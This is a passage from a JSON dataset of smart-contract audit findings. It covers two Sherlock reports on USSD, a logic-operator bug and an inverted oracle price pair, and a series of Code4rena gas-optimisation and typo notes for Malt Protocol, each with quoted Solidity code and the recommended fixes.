      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/193 \n\n## Found by \n0xHati, 0xlmanini, 0xyPhilic, Angry\\_Mustache\\_Man, Bahurum, J4de, Vagner, WATCHPUG, ast3ros, auditsea, carrotsmuggler, curiousapple, innertia, nobody2018, qpzm, saidam017, sashik\\_eth, simon135, smiling\\_heretic, toshii\n## Summary\n\nThe `SellUSSDBuyCollateral` function use `||` instand of `&&` to check whether the collateral is DAI. It is wrong and may cause `SellUSSDBuyCollateral` function revert.\n\n## Vulnerability Detail\n\n```solidity\n196       for (uint256 i = 0; i < collateral.length; i++) {\n197         uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n198         if (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]) {\n199 >>        if (collateral[i].token != uniPool.token0() || collateral[i].token != uniPool.token1()) {\n200             // don't touch DAI if it's needed to be bought (it's already bought)\n201             IUSSD(USSD).UniV3SwapInput(collateral[i].pathbuy, daibought/portions);\n202           }\n203         }\n204       }\n```\n\nLine 199 should use `&&` instand of `||` to ensure that the token is not DAI. If the token is DAI, the `UniV3SwapInput` function will revert because that DAI's `pathbuy` is empty.\n\n## Impact\n\nThe `SellUSSDBuyCollateral` will revert and USSD will become unstable.\n\n## Code Snippet\n\nhttps://github.com/USSDofficial/ussd-contracts/blob/f44c726371f3152634bcf0a3e630802e39dec49c/contracts/USSDRebalancer.sol#L199\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n```diff\n      for (uint256 i = 0; i < collateral.length; i++) {\n        uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n        if (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]) {\n-         if (collateral[i].token != uniPool.token0() || collateral[i].token != uniPool.token1()) {\n+         if (collateral[i].token != uniPool.token0() && collateral[i].token != uniPool.token1()) {\n            // don't touch DAI if it's needed to be bought (it's already bought)\n            IUSSD(USSD).UniV3SwapInput(collateral[i].pathbuy, daibought/portions);\n          }\n        }\n      }\n```",
      "summary": "\nThis bug report is about a vulnerability in the `SellUSSDBuyCollateral` function of the USSDRebalancer.sol. The issue was discovered by 0xHati, 0xlmanini, 0xyPhilic, Angry\\_Mustache\\_Man, Bahurum, J4de, Vagner, WATCHPUG, ast3ros, auditsea, carrotsmuggler, curiousapple, innertia, nobody2018, qpzm, saidam017, sashik\\_eth, simon135, smiling\\_heretic, toshii. The issue is that the `SellUSSDBuyCollateral` function uses `||` instead of `&&` to check whether the collateral is DAI. This is wrong and may cause the `SellUSSDBuyCollateral` function to revert and make USSD unstable. The code snippet can be found at https://github.com/USSDofficial/ussd-contracts/blob/f44c726371f3152634bcf0a3e630802e39dec49c/contracts/USSDRebalancer.sol#L199. The recommendation is to replace the `||` with `&&` in the code snippet.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/193",
      "tags": [],
      "finders": [
        "curiousapple",
        "J4de",
        "qpzm",
        "innertia",
        "toshii",
        "WATCHPUG",
        "0xHati",
        "nobody2018",
        "smiling\\_heretic",
        "carrotsmuggler",
        "0xyPhilic",
        "saidam017",
        "Angry\\_Mustache\\_Man",
        "Vagner",
        "auditsea",
        "ast3ros",
        "Bahurum",
        "simon135",
        "0xlmanini",
        "sashik\\_eth"
      ]
    },
    {
      "id": "19130",
      "title": "H-1: `StableOracleDAI` calculates `getPriceUSD` with inverted base/rate tokens for Chainlink price",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-05-USSD-judging/issues/102 \n\n## Found by \n0xPkhatri, 0xRobocop, 0xyPhilic, Bahurum, Brenzee, J4de, Juntao, Viktor\\_Cortess, juancito, nobody2018, pengun, sashik\\_eth, shaka, twicek\n## Summary\n\n`StableOracleDAI::getPriceUSD()` calculates the average price between the Uniswap pool price for a pair and the Chainlink feed as part of its result.\n\nThe problem is that it uses `WETH/DAI` as the base/rate tokens for the pool, and `DAI/ETH` for the Chainlink feed, which is the opposite.\n\nThis will incur in a huge price difference that will impact on the amount of USSD tokens being minted, while requesting the price from this oracle.\n\n## Vulnerability Detail\n\nIn `StableOracleDAI::getPrice()` the `price` from the Chainlink feed `priceFeedDAIETH` returns the price as DAI/ETH.\n\nThis can be checked on [Etherscan](https://etherscan.io/address/0x773616E4d11A78F511299002da57A0a94577F1f4#readContract#F10) and the [Chainlink Feeds Page](https://docs.chain.link/data-feeds/price-feeds/addresses/).\n\nAlso note the comment on the code is misleading, as it is refering to another pair:\n\n> chainlink price data is 8 decimals for WETH/USD\n\n```solidity\n/// constructor\n24:    priceFeedDAIETH = AggregatorV3Interface(\n25:        0x773616E4d11A78F511299002da57A0a94577F1f4\n26:    );\n\n/// getPrice()\n46:    // chainlink price data is 8 decimals for WETH/USD, so multiply by 10 decimals to get 18 decimal fractional\n47:    //(uint80 roundID, int256 price, uint256 startedAt, uint256 timeStamp, uint80 answeredInRound) = priceFeedDAIETH.latestRoundData();\n48:    (, int256 price, , , ) = priceFeedDAIETH.latestRoundData();\n```\n\n[Link to code](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L46-L48)\n\nOn the other hand, the price coming from the Uniswap pool `DAIWethPrice` returns the price as `WETH/DAI`.\n\nNote that the relation WETH/DAI is given by the orders of the token addresses passed as arguments, being the first the base token, and the second the quote token.\n\nAlso note that the variable name `DAIWethPrice` is misleading as well as the base/rate are the opposite (although this doesn't affect the code).\n\n```solidity\n    uint256 DAIWethPrice = DAIEthOracle.quoteSpecificPoolsWithTimePeriod(\n        1000000000000000000, // 1 Eth\n        0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH (base token) // @audit\n        0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI (quote token) // @audit\n        pools, // DAI/WETH pool uni v3\n        600 // period\n    );\n```\n\n[Link to code](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L36-L42)\n\nFinally, both values are used to calculate an average price of in `((DAIWethPrice + uint256(price) * 1e10) / 2)`.\n\nBut as seen, one has price in `DAI/ETH` and the other one in `WETH/DAI`, which leads to an incorrect result.\n\n```solidity\n    return\n        (wethPriceUSD * 1e18) /\n        ((DAIWethPrice + uint256(price) * 1e10) / 2);\n```\n\n[Link to code](https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L50C15-L52)\n\nThe average will be lower in this case, and the resulting price higher. \n\nThis will be used by `USSD::mintForToken()` for calculating the amount of tokens to mint for the user, and thus giving them much more than they should.\n\nAlso worth mentioning that `USSDRebalancer::rebalance()` also relies on the result of this price calculation and will make it perform trades with incorrect values.\n\n## Impact\n\nUsers will receive far more USSD tokens than they should when they call `mintForToken()`, ruining the token value.\n\nWhen performed the `USSDRebalancer::rebalance()`, all the calculations will be broken for the DAI oracle, leading to incorrect pool trades due to the error in `getPrice()`\n\n## Code Snippet\n\n- https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L46C28-L48\n- https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L36-L42\n- https://github.com/sherlock-audit/2023-05-USSD/blob/main/ussd-contracts/contracts/oracles/StableOracleDAI.sol#L50C15-L52\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCalculate the inverse of the `price` returned by the Chainlink feed so that it can be averaged with the pool price, making sure that both use the correct `WETH/DAI` and `ETH/DAI` base/rate tokens.\n\n\n\n\n\n## Discussion\n\n**T1MOH593**\n\nEscalate for 10 USDC\n\nThis is not a duplicate of https://github.com/sherlock-audit/2023-05-USSD-judging/issues/909.\nIt tells about using DAI/ETH instead of ETH/DAI on Chainlink. And #909 tells about completely different issue with oracles\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> This is not a duplicate of https://github.com/sherlock-audit/2023-05-USSD-judging/issues/909.\n> It tells about using DAI/ETH instead of ETH/DAI on Chainlink. And #909 tells about completely different issue with oracles\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**0xJuancito**\n\nEscalate for 10 USDC\n\nAgree with the previous comment. \n\nThis is an **independent High** impact finding. It is not a duplicate of https://github.com/sherlock-audit/2023-05-USSD-judging/issues/909, and hasn't been exposed by other findings selected for report.\n\nIt's main point is explained on the Summary:\n\n> The problem is that it uses WETH/DAI as the base/rate tokens for the pool, and DAI/ETH for the Chainlink feed, which is the opposite.\n\nA more detailed explanation and recommendation to fix it is included on the rest of the report.\n\nPossible duplicates:\n\n- https://github.com/sherlock-audit/2023-05-USSD-judging/issues/795\n- https://github.com/sherlock-audit/2023-05-USSD-judging/issues/774\n- https://github.com/sherlock-audit/2023-05-USSD-judging/issues/491\n- https://github.com/sherlock-audit/2023-05-USSD-judging/issues/269\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> \n> Agree with the previous comment. \n> \n> This is an **independent High** impact finding. It is not a duplicate of https://github.com/sherlock-audit/2023-05-USSD-judging/issues/909, and hasn't been exposed by other findings selected for report.\n> \n> It's main point is explained on the Summary:\n> \n> > The problem is that it uses WETH/DAI as the base/rate tokens for the pool, and DAI/ETH for the Chainlink feed, which is the opposite.\n> \n> A more detailed explanation and recommendation to fix it is included on the rest of the report.\n> \n> Possible duplicates:\n> \n> - https://github.com/sherlock-audit/2023-05-USSD-judging/issues/795\n> - https://github.com/sherlock-audit/2023-05-USSD-judging/issues/774\n> - https://github.com/sherlock-audit/2023-05-USSD-judging/issues/491\n> - https://github.com/sherlock-audit/2023-05-USSD-judging/issues/269\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**ctf-sec**\n\nSee my comments in https://github.com/sherlock-audit/2023-05-USSD-judging/issues/555\n\n**hrishibhat**\n\nResult:\nHigh\nHas duplicates \nThis is a valid separate issue.\n\n\n**sherlock-admin**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [T1MOH593](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/102/#issuecomment-1604525700): accepted\n- [0xJuancito](https://github.com/sherlock-audit/2023-05-USSD-judging/issues/102/#issuecomment-1605034302): accepted",
      "summary": "\nThis bug report is about an issue found in `StableOracleDAI::getPriceUSD()`, which is part of the USSD contracts. This function calculates the average price between the Uniswap pool price for a pair and the Chainlink feed as part of its result. The problem is that it uses `WETH/DAI` as the base/rate tokens for the pool, and `DAI/ETH` for the Chainlink feed, which is the opposite. This will lead to a huge price difference that will impact on the amount of USSD tokens being minted, while requesting the price from this oracle.\n\nThe code snippets provided in the bug report show that the Chainlink feed `priceFeedDAIETH` returns the price as DAI/ETH, while the price coming from the Uniswap pool `DAIWethPrice` returns the price as `WETH/DAI`. Both values are then used to calculate an average price, but as seen, one has price in `DAI/ETH` and the other one in `WETH/DAI`, which leads to an incorrect result.\n\nThe impact of this bug is that users will receive far more USSD tokens than they should when they call `mintForToken()`, ruining the token value. When performed the `USSDRebalancer::rebalance()`, all the calculations will be broken for the DAI oracle, leading to incorrect pool trades due to the error in `getPrice()`.\n\nThe recommendation to fix this issue is to calculate the inverse of the `price` returned by the Chainlink feed so that it can be averaged with the pool price, making sure that both use the correct `WETH/DAI` and `ETH/DAI` base/rate tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "USSD - Autonomous Secure Dollar",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-USSD-judging/issues/102",
      "tags": [],
      "finders": [
        "Juntao",
        "0xyPhilic",
        "J4de",
        "Bahurum",
        "juancito",
        "Viktor\\_Cortess",
        "0xPkhatri",
        "twicek",
        "pengun",
        "0xRobocop",
        "shaka",
        "nobody2018",
        "Brenzee",
        "sashik\\_eth"
      ]
    },
    {
      "id": "23862",
      "title": "[N-01] Typo",
      "impact": "LOW",
      "content": "\n- https://github.com/code-423n4/2023-02-malt/blob/700f9b468f9cf8c9c5cffaa1eba1b8dea40503f9/contracts/StabilityPod/StabilizerNode.sol#L411\n\nsandwich is not correct here.\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/42)**\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "16120",
      "title": "[G-17] RewardThrottle.sol has code that needs to be UNCHECKED in many places",
      "impact": "GAS",
      "content": "\nL117 SHOULD BE UNCHECKED DUE TO L116\n\nL162 AND L146 SHOULD BE UNCHECKED DUE TO L145\n\nL222 SHOULD BE UNCHECKED DUE TO L219\n...\n\n```\n116:        if (balance > remainder) {\n117          balance -= remainder;\n...\n145    if (cashflowAverageApr > targetCashflowApr) {\n146      uint256 delta = cashflowAverageApr - targetCashflowApr;\n...\n162:      uint256 delta = targetCashflowApr - cashflowAverageApr;\n...\n219    if (endEpoch < averagePeriod) {\n      averagePeriod = currentEpoch;\n    } else {\n222:      startEpoch = endEpoch - averagePeriod;\n...\n```\n\n**[0xScotch (Malt) confirmed](https://github.com/code-423n4/2023-02-malt-findings/issues/19)**\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-17-rewardthrottlesol-has-code-that-needs-to-be-unchecked-in-many-places",
      "tags": [],
      "finders": []
    },
    {
      "id": "16119",
      "title": "[G-16] LinearDistributor.sol has code that needs to be UNCHECKED in many places",
      "impact": "GAS",
      "content": "\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn’t possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an unchecked block: https://docs.soliditylang.org/en/v0.8.7/control-structures.html#checked-or-unchecked-arithmetic\n\n\nL149 SHOULD BE UNCHECKED DUE TO L147\n\n\nL169 SHOULD BE UNCHECKED DUE TO L164\n\n\nL188 SHOULD BE UNCHECKED DUE TO L186\n\n```solidity\n147:    if (balance > bufferRequirement) {\n148:      // We have more than the buffer required. Forfeit the rest\n149:      uint256 net = balance - bufferRequirement;\n150:      _forfeit(net);\n151:    }\n...\n163:    require(\n164:      amount <= declaredBalance,\n165:      \"Can't decrement more than total reward balance\"\n166:    );\n167:\n168:    if (amount > 0) {\n169:      declaredBalance = declaredBalance - amount;\n170:    }\n...\n185:  function _forfeit(uint256 forfeited) internal {\n186:    require(forfeited <= declaredBalance, \"Cannot forfeit more than declared\");\n187:\n188:    declaredBalance = declaredBalance - forfeited;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-16-lineardistributorsol-has-code-that-needs-to-be-unchecked-in-many-places",
      "tags": [],
      "finders": []
    },
    {
      "id": "16118",
      "title": "[G-15] `SwingTraderManager.delegateCapital()`: swingTraders should get cached",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];         //@audit gas: should cache \"swingTraders\" (SLOAD 1)\n\n      if (!trader.active) {\n        continue;\n      }\n\n      uint256 traderBalance = collateralToken.balanceOf(trader.traderContract);\n      totalCapital += traderBalance;\n      traderCapital[i] = traderBalance;\n    }\n\n    if (totalCapital == 0) {\n      return;\n    }\n\n    uint256 capitalUsed;\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];         //@audit gas: should cache \"swingTraders\" (SLOAD 2)\n      uint256 share = (amount * traderCapital[i]) / totalCapital;\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-15-swingtradermanagerdelegatecapital-swingtraders-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "16117",
      "title": "[G-14] `SwingTraderManager.sellMalt()`: swingTraders should get cached",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];           //@audit gas: should cache \"swingTraders\" (SLOAD 1)\n\n      if (!trader.active) {\n        continue;\n      }\n\n      uint256 traderMaltBalance = malt.balanceOf(trader.traderContract);\n      totalMalt += traderMaltBalance;\n      traderMalt[i] = traderMaltBalance;\n    }\n\n    if (totalMalt == 0) {\n      return 0;\n    }\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];          //@audit gas: should cache \"swingTraders\" (SLOAD 2)\n      uint256 share = (maxAmount * traderMalt[i]) / totalMalt;\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-14-swingtradermanagersellmalt-swingtraders-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "16116",
      "title": "[G-13] `SwingTraderManager.buyMalt()`: swingTraders should get cached",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];          //@audit gas: should cache \"swingTraders\" (SLOAD 1)\n\n      if (!trader.active) {\n        continue;\n      }\n\n      uint256 traderBalance = collateralToken.balanceOf(trader.traderContract);\n      totalCapital += traderBalance;\n      traderCapital[i] = traderBalance;\n    }\n\n    if (totalCapital == 0) {\n      return 0;\n    }\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];           //@audit gas: should cache \"swingTraders\" (SLOAD 2)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-13-swingtradermanagerbuymalt-swingtraders-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "16115",
      "title": "[G-12] `LinearDistributor._forfeit()`: declaredBalance should get cached",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n  function _forfeit(uint256 forfeited) internal {\n    require(forfeited <= declaredBalance, \"Cannot forfeit more than declared\");  //@audit gas: should cache \"declaredBalance\" (SLOAD 1)\n\n    declaredBalance = declaredBalance - forfeited;                               //@audit gas: should cache \"declaredBalance\" (SLOAD 2)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-12-lineardistributor_forfeit-declaredbalance-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "16114",
      "title": "[G-11] `LinearDistributor.decrementRewards()`: declaredBalance should get cached",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n  function decrementRewards(uint256 amount)\n    external\n    onlyRoleMalt(REWARD_MINE_ROLE, \"Only reward mine\")\n  {\n    require(\n      amount <= declaredBalance,                         //@audit gas: should cache \"declaredBalance\" (SLOAD 1)\n      \"Can't decrement more than total reward balance\"\n    );\n\n    if (amount > 0) {\n      declaredBalance = declaredBalance - amount;        //@audit gas: should cache \"declaredBalance\" (SLOAD 2)\n    }\n  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-11-lineardistributordecrementrewards-declaredbalance-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "16113",
      "title": "[G-10] `GlobalImpliedCollateralService.sync()`: existingPool.* should get cached",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n    uint256 existingCollateral = existingPool.total;\n\n    uint256 total = collateral.total; // gas\n    if (existingCollateral <= total) {\n      total -= existingCollateral; // subtract existing value\n    } else {\n      total = 0;\n    }\n\n    uint256 swingTraderMalt = collateral.swingTraderMalt; // gas  \n    if (existingPool.swingTraderMalt <= swingTraderMalt) {        //@audit gas: should cache \"existingPool.swingTraderMalt\" (SLOAD 1)\n      swingTraderMalt -= existingPool.swingTraderMalt;            //@audit gas: should cache \"existingPool.swingTraderMalt\" (SLOAD 2)\n    } else {\n      swingTraderMalt = 0;\n    }\n\n    uint256 swingTraderCollat = collateral.swingTrader; // gas\n    if (existingPool.swingTrader <= swingTraderCollat) {         //@audit gas: should cache \"existingPool.swingTrader\" (SLOAD 1)\n      swingTraderCollat -= existingPool.swingTrader;             //@audit gas: should cache \"existingPool.swingTrader\" (SLOAD 2)\n    } else {\n      swingTraderCollat = 0;\n    }\n\n    uint256 arb = collateral.arbTokens; // gas\n    if (existingPool.arbTokens <= arb) {                         //@audit gas: should cache \"existingPool.arbTokens\" (SLOAD 1)\n      arb -= existingPool.arbTokens;                             //@audit gas: should cache \"existingPool.arbTokens\" (SLOAD 2)\n    } else {\n      arb = 0;\n    }\n\n    uint256 overflow = collateral.rewardOverflow; // gas\n    if (existingPool.rewardOverflow <= overflow) {               //@audit gas: should cache \"existingPool.rewardOverflow\" (SLOAD 1)\n      overflow -= existingPool.rewardOverflow;                   //@audit gas: should cache \"existingPool.rewardOverflow\" (SLOAD 2)\n    } else {\n      overflow = 0;\n    }\n\n    uint256 liquidityExtension = collateral.liquidityExtension; // gas\n    if (existingPool.liquidityExtension <= liquidityExtension) { //@audit gas: should cache \"existingPool.liquidityExtension\" (SLOAD 1)\n      liquidityExtension -= existingPool.liquidityExtension;     //@audit gas: should cache \"existingPool.liquidityExtension\" (SLOAD 2)\n    } else {\n      liquidityExtension = 0;\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-10-globalimpliedcollateralservicesync-existingpool-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "16112",
      "title": "[G-09] `SwingTraderManager.deployedCapital()`: should use memory instead of storage variable",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```\n  function deployedCapital() external view returns (uint256 deployed) {\n    uint256[] memory traderIds = activeTraders;\n    uint256 length = traderIds.length;\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];    // @audit gas: should use  'swingTraders[traderIds[i]]'\n```\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-09-swingtradermanagerdeployedcapital-should-use-memory-instead-of-storage-variable",
      "tags": [],
      "finders": []
    },
    {
      "id": "16111",
      "title": "[G-08] `SwingTraderManager.delegateCapital()`: should use memory instead of storage variable",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n  function delegateCapital(uint256 amount, address destination)\n    external\n    onlyRoleMalt(CAPITAL_DELEGATE_ROLE, \"Must have capital delegation privs\")\n    onlyActive\n  {\n    uint256[] memory traderIds = activeTraders;\n    uint256 length = traderIds.length;\n\n    uint256 totalCapital;\n    uint256[] memory traderCapital = new uint256[](length);\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];   // @audit gas: should use  'swingTraders[traderIds[i]]'\n\n      if (!trader.active) {\n        continue;\n      }\n\n      uint256 traderBalance = collateralToken.balanceOf(trader.traderContract);\n      totalCapital += traderBalance;\n      traderCapital[i] = traderBalance;\n    }\n\n    if (totalCapital == 0) {\n      return;\n    }\n\n    uint256 capitalUsed;\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];    // @audit gas: should use  'swingTraders[traderIds[i]]'\n```\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-08-swingtradermanagerdelegatecapital-should-use-memory-instead-of-storage-variable",
      "tags": [],
      "finders": []
    },
    {
      "id": "16110",
      "title": "[G-07] `SwingTraderManager.getTokenBalances()`: should use memory instead of storage variable",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n  function getTokenBalances()\n    external\n    view\n    returns (uint256 maltBalance, uint256 collateralBalance)\n  {\n    uint256[] memory traderIds = activeTraders;\n    uint256 length = traderIds.length;\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];  // @audit gas: should use  'swingTraders[traderIds[i]]'\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-07-swingtradermanagergettokenbalances-should-use-memory-instead-of-storage-variable",
      "tags": [],
      "finders": []
    },
    {
      "id": "16109",
      "title": "[G-06] `SwingTraderManager.calculateSwingTraderMaltRatio()`: should use memory instead of storage variable",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n  function calculateSwingTraderMaltRatio()\n    public\n    view\n    returns (uint256 maltRatio)\n  {\n    uint256[] memory traderIds = activeTraders;\n    uint256 length = traderIds.length;\n    uint256 decimals = collateralToken.decimals();\n    uint256 maltDecimals = malt.decimals();\n    uint256 totalMaltBalance;\n    uint256 totalCollateralBalance;\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]]; // @audit gas: should use  'swingTraders[traderIds[i]]'\n```\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-06-swingtradermanagercalculateswingtradermaltratio-should-use-memory-instead-of-storage-variable",
      "tags": [],
      "finders": []
    },
    {
      "id": "16108",
      "title": "[G-05] `SwingTraderManager.costBasis()`: should use memory instead of storage variable",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n    uint256[] memory traderIds = activeTraders;\n    uint256 length = traderIds.length;\n    decimals = collateralToken.decimals();\n\n    uint256 totalMaltBalance;\n    uint256 totalDeployedCapital;\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]]; // @audit gas: should use  'swingTraders[traderIds[i]]'\n```\n\n\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-05-swingtradermanagercostbasis-should-use-memory-instead-of-storage-variable",
      "tags": [],
      "finders": []
    },
    {
      "id": "16107",
      "title": "[G-04] `SwingTraderManager.sellMalt()`: should use memory instead of storage variable",
      "impact": "GAS",
      "content": "\nSee @audit tag\n\n```solidity\n    uint256[] memory traderIds = activeTraders;\n    uint256 length = traderIds.length;\n    uint256 profit;\n\n    uint256 totalMalt;\n    uint256[] memory traderMalt = new uint256[](length);\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];   // @audit gas: should use  'swingTraders[traderIds[i]]'\n\n      if (!trader.active) {\n        continue;\n      }\n\n      uint256 traderMaltBalance = malt.balanceOf(trader.traderContract);\n      totalMalt += traderMaltBalance;\n      traderMalt[i] = traderMaltBalance;\n    }\n\n    if (totalMalt == 0) {\n      return 0;\n    }\n\n    for (uint256 i; i < length; ++i) {\n      SwingTraderData memory trader = swingTraders[activeTraders[i]];   // @audit gas: should use  'swingTraders[traderIds[i]]'\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Malt Protocol",
      "source_link": "https://code4rena.com/reports/2023-02-malt",
      "github_link": "#g-04-swingtradermanagersellmalt-should-use-memory-instead-of-storage-variable",
      "tags": [],
      "finders": []
    },
    {
      "id": "16106",
      "title": "[G-03] `SwingTraderManager.buyMalt()`: should use memory instead of storage variable",
      "impact": "GAS",
